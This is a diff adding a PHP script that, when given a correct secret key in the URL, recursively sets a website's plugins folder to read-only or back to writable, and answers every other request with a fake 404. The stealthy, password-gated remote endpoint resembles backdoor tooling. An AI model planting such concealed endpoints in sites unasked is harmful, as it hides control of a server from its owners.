@@ -1,0 +1,74 @@
+<?php
+/****************************************************
+ * Simple Security Plugin Locker (Clean Version)
+ * - No IP check
+ * - No User-Agent check
+ * - Password hash only
+ * - Fake 404 on invalid access
+ ****************************************************/
+
+// =============================
+// CONFIG
+// =============================
+
+// HASH PASSWORD — ganti sesuai kebutuhan
+$PASSWORD_HASH = '$2a$12$FO.t.v/pScf7TshzRUPvIOx4KaevFZt19M5I3m8Rrg4XyFem6a/xq';
+
+// Path folder plugins (TANPA TAB, TANPA SPASI)
+$pluginsPath = "/home/jurnalts/public_html/plugins";
+
+
+// =============================
+// VALIDASI
+// =============================
+if (!isset($_GET['key']) || !isset($_GET['mode'])) {
+    http_response_code(404);
+    exit;
+}
+
+if (!password_verify($_GET['key'], $PASSWORD_HASH)) {
+    http_response_code(404);
+    exit;
+}
+
+$mode = $_GET['mode'];
+
+if (!file_exists($pluginsPath)) {
+    http_response_code(404);
+    exit;
+}
+
+
+// =============================
+// RECURSIVE CHMOD
+// =============================
+function chmod_recursive($path, $perm) {
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+
+    foreach ($iterator as $item) {
+        @chmod($item->getPathname(), $perm);
+    }
+
+    @chmod($path, $perm);
+}
+
+
+// =============================
+// AKSI
+// =============================
+if ($mode === "lock") {
+    chmod_recursive($pluginsPath, 0555);
+    exit("Locked");
+}
+
+if ($mode === "unlock") {
+    chmod_recursive($pluginsPath, 0755);
+    exit("Unlocked");
+}
+
+// Mode salah → 404
+http_response_code(404);
+exit;
